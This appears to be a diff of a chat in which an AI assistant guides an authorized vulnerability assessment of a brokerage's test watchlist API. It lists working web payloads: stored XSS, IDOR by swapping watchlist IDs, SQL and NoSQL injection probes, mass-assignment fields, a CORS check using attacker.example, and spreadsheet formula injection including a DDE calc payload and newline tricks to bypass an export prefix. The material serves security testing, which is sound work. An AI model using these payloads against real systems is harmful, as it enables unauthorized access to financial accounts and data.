@@ -1,81 +1,639 @@
-2. Verify the API using curl
-
-Run this command in PowerShell:
-
-curl.exe -v --ssl-no-revoke -x http://127.0.0.1:8089 https://mlogin.sit.etrade.com/login/auth/v1_4
-
-The --ssl-no-revoke option disables certificate revocation checking for this test while retaining other certificate validation.
-
-If that still fails, test:
-
-curl.exe -vk -x http://127.0.0.1:8089 https://mlogin.sit.etrade.com/login/auth/v1_4
-
-The -k option disables certificate verification and should be used only for troubleshooting.
-
-If you receive the JSON response containing:
-
+But test it anyway.
+Payload
 {
-  "status": "SUCCESS",
-  "reason": "STEP_COMPLETED"
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": "<img src=x onerror=alert(document.domain)>"
+  }
 }
 
-then the API is accessible through the proxy.
+A safer first-stage marker is:
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": "<vapt-test>"
+  }
+}
 
-3. Configure Bruno to use the proxy
+Then:
+1. Send request.
+2. Refresh the application.
+3. Navigate away.
+4. Return to the watchlist.
+5. Open watchlist selection.
+6. Check the DOM.
+7. Export the watchlist if applicable.
+Secure behavior
+The UI should display:
+<img src=x onerror=alert(document.domain)>
 
-Bruno Proxy Configuration
+as text.
+It should not create an <img> element.
+3. Watchlist IDOR / Broken Access Control — CRITICAL TEST
+Your request contains:
+"watchlistId": 27104571000
 
-Use these values in Bruno's proxy configuration, if supported by your installed version.
+This is a very important parameter.
+You need two authorized UAT users to properly test this.
+Test
+Account A:
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": "A-Test"
+  }
+}
 
-Proxy type
+Account B should have a different watchlist.
+Capture Account B's:
+watchlistId
 
-HTTP
+Then, while authenticated as Account A, change only:
+"watchlistId": "<Account-B-test-watchlist-id>"
 
-Proxy host
+Example:
+{
+  "updateWatchList": {
+    "watchlistId": 27104572000,
+    "watchlistName": "VAPT-IDOR-TEST"
+  }
+}
 
-127.0.0.1
+Expected
+Account A should receive something like:
+403 Forbidden
 
-Proxy port
+or:
+401 Unauthorized
 
-8089
+or an application-level authorization error.
+It must not modify Account B's watchlist.
+This is much more significant than the formula issue if exploitable.
+4. Watchlist read IDOR
+Don't test only modification.
+Find the API that retrieves:
+watchlistId
 
-Proxy URL
+Then perform the same test.
+For example, if you identify:
+{
+  "watchlistId": 27104571000
+}
 
-http://127.0.0.1:8089
+replace it with another approved test user's watchlist ID.
+Expected
+Account A → Account B watchlist
+             ↓
+           DENIED
 
-Copy proxy URL
+If Account A can retrieve Account B's watchlist, that's a confirmed Broken Object Level Authorization / IDOR issue.
+5. watchlistName SQL Injection
+Because the name is persisted, test the backend input handling.
+Start with harmless probes.
+Payload
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": "VAPT'"
+  }
+}
 
-If Bruno supports a proxy URL, enter the full URL above.
+Then:
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": "VAPT\""
+  }
+}
 
-Do not enter the target application's IP address as the proxy.
+Then:
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": "VAPT')"
+  }
+}
 
-4. If Bruno does not have proxy settings
+Look for:
+- HTTP 500
+- SQL error
+- database error
+- stack trace
+- abnormal response
+- changed query behavior
+Do not jump immediately to destructive SQL payloads. First establish whether the parameter reaches a database query unsafely.
+6. NoSQL / JSON injection
+If the backend accepts JSON and you want to test whether it improperly interprets objects rather than strings, replace the string with an object.
+Test
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": {
+      "$ne": null
+    }
+  }
+}
 
-You can try launching Bruno with proxy environment variables.
+Also:
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": {
+      "$regex": ".*"
+    }
+  }
+}
 
-Close Bruno completely and run the following in PowerShell:
+Expected
+The API should reject these because watchlistName should be a string.
+For example:
+400 Bad Request
 
-$env:HTTP_PROXY="http://127.0.0.1:8089"
-$env:HTTPS_PROXY="http://127.0.0.1:8089"
+7. Type confusion
+This is very useful for your API.
+Normally:
+"watchlistName": "My Watchlist"
 
-Then launch Bruno from that same PowerShell session using its executable path.
+Test:
+Null
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": null
+  }
+}
 
-For example, if installed in the default location:
+Number
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": 123456
+  }
+}
 
-& "$env:LOCALAPPDATA\Programs\bruno\Bruno.exe"
+Boolean
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": true
+  }
+}
 
-The exact executable location may differ. Also, whether Bruno honors these variables depends on its version and HTTP client implementation.
+Array
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": []
+  }
+}
 
-5. If you get an SSL error in Bruno
+Object
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": {}
+  }
+}
 
-After fixing the proxy, you may encounter a certificate error.
+Expected
+The API should reject invalid types.
+8. Mass Assignment / Extra Parameters
+Try adding properties that are not normally generated by the UI.
+For example:
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": "VAPT-Test",
+    "userId": "OTHER-USER",
+    "accountId": "OTHER-ACCOUNT",
+    "ownerId": "OTHER-USER",
+    "isDefault": true,
+    "isShared": true,
+    "role": "admin"
+  }
+}
 
-If that happens, check whether Bruno trusts your corporate CA certificate. Importing the approved corporate CA is preferable to disabling certificate validation.
+Don't assume these fields actually exist. The purpose is to determine whether the API accepts security-sensitive properties supplied by the client.
+Vulnerable behavior
+If adding:
+"ownerId": "OTHER-USER"
 
-For an authorized SIT testing environment, you can temporarily disable SSL certificate verification in Bruno to isolate the issue, then re-enable it.
+changes ownership, that becomes a serious authorization issue.
+If:
+"isShared": true
 
-Next step
+changes visibility without authorization, that's also significant.
+9. Duplicate watchlist symbols
+Your watchlist response contains instruments such as:
+GM
+GOOG
 
-First, run this single command:
+Test whether the API allows the same symbol repeatedly.
+For example, if the update request contains:
+{
+  "watchlistId": 27104571000,
+  "symbols": [
+    "AAPL",
+    "AAPL",
+    "AAPL",
+    "AAPL"
+  ]
+}
 
-curl.exe -v --ssl-no-revoke -x http://127.0.0.1:8089 https://mlogin.sit.etrade.com/login/auth/v1_4
+Expected:
+AAPL
+
+should exist once.
+Test whether duplicates are:
+- accepted
+- persisted
+- displayed
+- exported
+- counted separately
+This is similar to the account-group issue you found earlier.
+10. Instrument ID tampering
+Your response exposes:
+"instrumentId": 7162361
+
+and:
+"activeInstrumentId": 7162361
+
+If the update request accepts an instrumentId, test whether the server verifies that the instrument is valid and available to the user.
+Example:
+{
+  "watchlistId": 27104571000,
+  "instrumentId": 7162361,
+  "watchlistSymbol": "GOOG"
+}
+
+Then test an invalid value:
+{
+  "watchlistId": 27104571000,
+  "instrumentId": 999999999,
+  "watchlistSymbol": "VAPT"
+}
+
+And mismatched values:
+{
+  "watchlistId": 27104571000,
+  "instrumentId": 7162361,
+  "watchlistSymbol": "AAPL"
+}
+
+The backend should not blindly trust the client relationship between:
+instrumentId ↔ symbol
+
+11. Watchlist symbol tampering
+If you find an update request containing:
+{
+  "watchlistSymbol": "GOOG"
+}
+
+test:
+{
+  "watchlistSymbol": "<vapt-test>"
+}
+
+{
+  "watchlistSymbol": "../../vapt"
+}
+
+{
+  "watchlistSymbol": "AAPL<script>"
+}
+
+{
+  "watchlistSymbol": "AAPL'"
+}
+
+The backend should validate the symbol against the supported instrument model.
+12. Watchlist name length / DoS-style validation
+Test progressively increasing lengths.
+Start with:
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  }
+}
+
+Then test the documented maximum plus one.
+For example, if maximum is 50:
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  }
+}
+
+Expected:
+400 Bad Request
+
+or controlled validation.
+Also check whether extremely long values cause:
+- UI freezing
+- database errors
+- HTTP 500
+- export failure
+- layout corruption
+13. Unicode / encoding
+Test:
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": "VAPT-日本-తెలుగు-测试"
+  }
+}
+
+And:
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": "VAPT\u0000TEST"
+  }
+}
+
+Check:
+- API response
+- UI
+- persistence
+- Excel export
+14. CORS
+Your response shows:
+Access-Control-Allow-Origin: https:...
+Access-Control-Allow-Credentials: ...
+
+The screenshot truncates the values, so you need to inspect the Raw response.
+Test with a controlled origin.
+For example:
+Origin: https://attacker.example
+
+Send the same request and inspect:
+Access-Control-Allow-Origin
+Access-Control-Allow-Credentials
+
+Secure result
+The server should not allow an arbitrary origin to read authenticated responses.
+Particularly investigate the combination:
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+
+That combination is problematic and normally rejected by browsers, but dynamic origin reflection can also be dangerous if implemented incorrectly.
+15. Security headers
+From your screenshot I can already see:
+Strict-Transport-Security
+X-XSS-Protection
+
+and:
+Cache-Control: no-cache, no-store
+Pragma: no-cache
+
+These are useful.
+Check the complete response for:
+Content-Security-Policy
+X-Content-Type-Options
+X-Frame-Options
+Referrer-Policy
+Permissions-Policy
+Strict-Transport-Security
+Cache-Control
+
+For the financial application, pay particular attention to:
+Cache-Control: no-store
+
+for authenticated/account-sensitive responses.
+16. ETag / cache testing
+Your response contains:
+ETag: W/"..."
+
+Test whether an authenticated response can be retrieved from cache after logout or from another session.
+Workflow:
+Account A
+   ↓
+GET watchlist
+   ↓
+Capture ETag
+   ↓
+Logout
+   ↓
+Replay request
+
+Then test with Account B.
+The server must not accidentally return Account A's cached watchlist to Account B.
+This is particularly important because the application contains financial/account data.
+17. HTTP parameter pollution
+If you identify a URL parameter such as:
+?watchlistId=27104571000
+
+test:
+?watchlistId=27104571000&watchlistId=27104572000
+
+or if it is JSON:
+{
+  "watchlistId": 27104571000,
+  "watchlistId": 27104572000
+}
+
+Observe which value the server uses.
+Security-sensitive parameters should have deterministic handling.
+18. The most important test chain for YOUR screenshot
+I would execute these in this exact order:
+Test 1 — Stored formula injection
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": "=1+1"
+  }
+}
+
+Then export to Excel.
+If Excel displays 2 → confirmed formula injection.
+Test 2 — Stored XSS
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": "<img src=x onerror=alert(document.domain)>"
+  }
+}
+
+Refresh the application.
+If JavaScript executes → confirmed stored XSS.
+Test 3 — IDOR
+Using two UAT users:
+{
+  "updateWatchList": {
+    "watchlistId": "<USER-B-TEST-WATCHLIST-ID>",
+    "watchlistName": "IDOR-TEST"
+  }
+}
+
+while authenticated as User A.
+If User A modifies User B's watchlist → serious BOLA/IDOR finding.
+Test 4 — Mass assignment
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": "VAPT-Test",
+    "ownerId": "<OTHER-TEST-USER>",
+    "accountId": "<OTHER-TEST-ACCOUNT>",
+    "isShared": true,
+    "role": "admin"
+  }
+}
+
+If any security-sensitive property is honored → investigate as authorization/business-logic vulnerability.
+Test 5 — Type validation
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": {}
+  }
+}
+
+Then:
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": []
+  }
+}
+
+Then:
+{
+  "updateWatchList": {
+    "watchlistId": 27104571000,
+    "watchlistName": null
+  }
+}
+
+All should be rejected.
+One important point from your screenshots
+Your Excel screenshot is very valuable evidence.
+You have:
+Watchlist =cmd|' /C calc'!A
+
+persisted into the exported spreadsheet.
+But don't report it as confirmed formula injection yet merely because the string appears in Excel. The decisive test is whether Excel interprets the cell as a formula.
+Use:
+"watchlistName": "=1+1"
+
+Export it and see whether the resulting cell is:
+=1+1
+
+or:
+2
+
+If you get 2, send me the request/response and the exported-cell screenshot. I can help you determine the exact finding title, CWE, severity, attack scenario, impact, and remediation.   
+
+
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+if i send 1+1
+
+
+
+
+
+ 
+
+
+
+
+
+
+If you send 1+1, this is not a formula-injection payload. Excel will treat it as ordinary text.
+Your latest screenshot is more important: you sent:
+=1+1
+
+and the exported Excel shows:
+Watchlist =1+1, as of 09/30/26 at 10:54 AM EST
+
+That means the application is prepending Watchlist  before your supplied value. Therefore Excel sees the complete cell value as:
+Watchlist =1+1, as of ...
+
+rather than a formula beginning with =.
+So currently
+Test	Result	Assessment
+1+1	Displayed as text	Not formula injection
+=1+1	Exported as Watchlist =1+1, ...	No formula execution demonstrated
+=HYPERLINK(...)	Need to test	Check whether prefix prevents execution
++1+1	Need to test	Check spreadsheet interpretation
+-1+1	Need to test	Check spreadsheet interpretation
+@SUM(1,1)	Need to test	Check spreadsheet interpretation
+
+
+One more important test
+Don't test only the watchlist name. Your exported Excel contains other attacker-influenced fields:
+Symbol
+Description
+
+The watchlist name is apparently safely embedded into a larger string. But if a user-controlled Symbol or Description is written directly into an Excel cell, formula injection could still exist there.
+For example, if you have an API field that controls a symbol/description and the exported cell becomes exactly:
+=1+1
+
+rather than:
+Watchlist =1+1
+
+then Excel may evaluate it.
+For your current finding
+I would not report CSV/Excel Formula Injection based on this evidence. Your screenshot actually provides evidence that the watchlistName value is being incorporated into a larger text string, preventing it from being interpreted as an Excel formula.
+If you want to continue testing this properly, capture the API request that adds/updates a watchlist symbol, not just the watchlist name. That is the next place I'd check for formula injection.
+
+
+
+
+
+    
+
+
+
+
+
+
+
+
+any way to escape this prepending Watchlist 
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+If the exporter is constructing the Excel cell as something like:
+"Watchlist " + watchlistName + ", as of " + date
+
+then you generally cannot escape the Watchlist  prefix from the watchlistName field itself. Excel sees the entire resulting value, so:
+Watchlist =1+1, as of ...
+
+doesn't start with =, and therefore isn't a formula.
+However, for a VAPT assessment, you can safely check whether the prefix can be bypassed through encoding, line breaks, or another exported field.
+1. Test newline injection
+Try:
+{
+  "watchlistName": "\n=1+1"
+}
+
+and:
+{
+  "watchlistName": "\r\n=1+1"
+}
